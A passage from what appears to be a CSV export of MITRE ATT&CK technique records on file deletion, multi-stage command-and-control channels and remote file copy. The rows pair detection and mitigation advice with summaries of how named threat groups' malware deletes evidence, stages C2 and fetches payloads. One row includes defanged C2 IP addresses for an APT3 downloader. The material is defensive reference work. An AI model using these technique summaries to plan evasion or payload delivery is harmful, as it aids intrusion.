appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: Backdoor.Oldrea, Havex",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1107,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0083|Misdat]] is capable of deleting the backdoor file.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: Misdat,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1108,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']","['[[Software/S0053|SeaDuke]] can securely delete files, including deleting itself from the victim.[[CiteRef::Symantec Seaduke 2015]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1109,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0139|PowerDuke]] has a command to write random data across a file and delete it.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],Software: PowerDuke,['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1110,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']","['[[Group/G0032|Lazarus Group]] malware contains ""suicide scripts"" to delete malware binaries from the victim. It also uses secure file deletion to delete files from the victim.[[CiteRef::Novetta Blockbuster]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1111,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0153|RedLeaves]] can delete specified files.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: RedLeaves, BUGJUICE",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1112,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0106|cmd]] can be used to delete files from the file system.[[CiteRef::TechNet Del]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: cmd, cmd.exe",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1113,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Software/S0070|HTTPBrowser]] deletes its original installer file once installation is complete.[[CiteRef::ZScaler Hacking Team]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1114,"['It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.']",['Host forensic analysis'],[],['Walker Johnson'],"['Binary file metadata', 'File monitoring', 'Process command-line parameters']",['[[Group/G0027|Threat Group-3390]] has deleted existing logs and exfiltrated file archives from a victim.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Defense Evasion'],['Technique/T1107'],['File Deletion'],https://attack.mitre.org/wiki/Technique/T1107
1115,['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from [[Discovery]] of the system and network information or [[Lateral Movement]] to the originating process may also yield useful data.'],[],[],[],"['Netflow/Enclave netflow', 'Network device logs', 'Network protocol analysis', 'Packet capture', 'Process use of network']","[u'[[Software/S0069|BLACKCOFFEE]] uses Microsoft\u2019s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims\u2019 machines.[[CiteRef::FireEye APT17]]']",['APT17'],"['APT17', 'Deputy Dog']",['G0025'],"['Command and control infrastructure used in a multi-stage channel may be blocked if known ahead of time. If unique signatures are present in the C2 traffic, they could also be used as the basis of identifying and blocking the channel.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: BLACKCOFFEE,['Command and Control'],['Technique/T1104'],['Multi-Stage Channels'],https://attack.mitre.org/wiki/Technique/T1104
1116,['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from [[Discovery]] of the system and network information or [[Lateral Movement]] to the originating process may also yield useful data.'],[],[],[],"['Netflow/Enclave netflow', 'Network device logs', 'Network protocol analysis', 'Packet capture', 'Process use of network']","['[[Software/S0031|BACKSPACE]] attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs ""louder"" interactions with the malware.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Command and control infrastructure used in a multi-stage channel may be blocked if known ahead of time. If unique signatures are present in the C2 traffic, they could also be used as the basis of identifying and blocking the channel.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BACKSPACE, Lecna",['Command and Control'],['Technique/T1104'],['Multi-Stage Channels'],https://attack.mitre.org/wiki/Technique/T1104
1117,['Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from [[Discovery]] of the system and network information or [[Lateral Movement]] to the originating process may also yield useful data.'],[],[],[],"['Netflow/Enclave netflow', 'Network device logs', 'Network protocol analysis', 'Packet capture', 'Process use of network']","['An [[Group/G0022|APT3]] downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.[[CiteRef::FireEye Operation Double Tap]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Command and control infrastructure used in a multi-stage channel may be blocked if known ahead of time. If unique signatures are present in the C2 traffic, they could also be used as the basis of identifying and blocking the channel.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1104'],['Multi-Stage Channels'],https://attack.mitre.org/wiki/Technique/T1104
1118,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0074|Sakula]] has the capability to download files.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Sakula, Sakurel, VIPER","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1119,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0080|Mivast]] has the capability to download and execute .exe files.[[CiteRef::Symantec Backdoor.Mivast]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Mivast,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1120,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0145|POWERSOURCE]] has been observed being used to download [[Software/S0146|TEXTMATE]] and the Cobalt Strike Beacon payload onto victims.[[CiteRef::FireEye FIN7 March 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: POWERSOURCE, DNSMessenger","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1121,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Group/G0046|FIN7]] uses a PowerShell script to launch shellcode that retrieves an additional payload.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1122,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0147|Pteranodon]] can download and execute additional files.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Pteranodon,"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1123,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['Tools used by [[Group/G0047|Gamaredon Group]] are capable of downloading and executing additional payloads.[[CiteRef::Palo Alto Gamaredon Feb 2017]]'],['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],"['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1124,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0070|HTTPBrowser]] is capable of writing a file to the compromised system from the C2 server.[[CiteRef::Dell TG-3390]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: HTTPBrowser, Token Control, HttpDump","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1125,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0106|cmd]] can be used to copy files to a remotely connected system.[[CiteRef::TechNet Copy]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: cmd, cmd.exe","['Command and Control', 'Lateral Movement']",['Technique/T1105'],['Remote File Copy'],https://attack.mitre.org/wiki/Technique/T1105
1126,"['Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['File monitoring', 'Packet capture', 'Process use of network', 'Netflow/Enclave netflow', 'Network protocol analysis', 'Process monitoring']",['[[Software/S0124|Pisloader]] has a command to upload a file to the victim machine.[[CiteRef::Palo Alto DNS Requests]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network 